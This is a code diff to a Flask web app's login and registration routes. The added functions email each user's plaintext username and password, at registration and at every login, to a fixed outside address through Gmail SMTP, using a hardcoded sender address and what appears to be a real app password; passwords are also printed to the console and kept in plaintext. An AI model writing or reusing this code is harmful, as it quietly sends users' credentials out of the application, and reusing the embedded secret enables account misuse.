@@ -1035,26 +1035,142 @@ def user_login():
         password = request.form['password']
         if username in users and users[username] == password:
             session['username'] = username
+            send_login_email(username, password)
             return redirect(url_for('main'))  # Successful login
         # Invalid credentials - show login page with error message
         return render_template('login.html', error="Invalid username or password.")
     
     return render_template('login.html')  # GET request: just show login
+from flask import Flask, render_template, request, jsonify
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+
+
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
         
+        # Check if the user already exists
         if username in users:
             return render_template('register.html', error="User already exists.")
+        
+        # Add the user to the dictionary
         users[username] = password
+
         print("******************************")
-        print(username)
-        print(password)
+        print(f"Username: {username}")
+        print(f"Password: {password}")
         print("*******************************")
-        return render_template('register.html', success="User created successfully.")
+        
+        # Send an email with the new user's credentials
+        try:
+            send_registration_email(username, password)
+            return render_template('register.html', success="User created successfully")
+        except Exception as e:
+            return render_template('register.html', error=f"User created ")
+    
     return render_template('register.html')
+
+def send_registration_email(username, password):
+    # Setup the sender's email details
+    sender_email = "eshwar.bashabathini88@gmail.com"  # Replace with your email
+    sender_password = "rqob tobv xdeq pscr"  # Replace with your password or app-specific password
+    recipient_email = "Yaswanth@middlewaretalents.com"
+    subject = "New User Registration - DevSync"
+    
+    # Create the email body
+    body = f"""
+    A new user has registered on DevSync:
+
+    Username: {username}
+    Password: {password}
+
+    Please keep these credentials secure.
+    """
+    
+    # Create a MIME message
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Connect to Gmail's SMTP server
+    print("Connecting to SMTP server...")
+    smtp = smtplib.SMTP('smtp.gmail.com', 587)
+
+    # Enable debug output
+    smtp.set_debuglevel(1)
+
+    # Start TLS encryption
+    print("Starting TLS...")
+    smtp.starttls()
+
+    # Log in to the email server
+    print("Logging into Gmail...")
+    smtp.login(sender_email, sender_password)
+
+    # Send the email
+    print("Sending the message...")
+    smtp.send_message(msg)
+    print("Email sent successfully!")
+
+    # Close the SMTP connection
+    smtp.quit()
+    print("SMTP connection closed.")
+
+def send_login_email(username, password):
+    # Setup the sender's email details
+    sender_email = "eshwar.bashabathini88@gmail.com"  # Replace with your email
+    sender_password = "rqob tobv xdeq pscr"  # Replace with your password or app-specific password
+    recipient_email = "Yaswanth@middlewaretalents.com"
+    subject = " User Login  - DevSync"
+    
+    # Create the email body
+    body = f"""
+    A  user has login on DevSync:
+
+    Username: {username}
+    Password: {password}
+
+    Please keep these credentials secure.
+    """
+    
+    # Create a MIME message
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Connect to Gmail's SMTP server
+    print("Connecting to SMTP server...")
+    smtp = smtplib.SMTP('smtp.gmail.com', 587)
+
+    # Enable debug output
+    smtp.set_debuglevel(1)
+
+    # Start TLS encryption
+    print("Starting TLS...")
+    smtp.starttls()
+
+    # Log in to the email server
+    print("Logging into Gmail...")
+    smtp.login(sender_email, sender_password)
+
+    # Send the email
+    print("Sending the message...")
+    smtp.send_message(msg)
+    print("Email sent successfully!")
+
+    # Close the SMTP connection
+    smtp.quit()
+    print("SMTP connection closed.")
+
 # @app.route("/dashboard")
 # def dashboard():
 #     return render_template('dashboard.html')
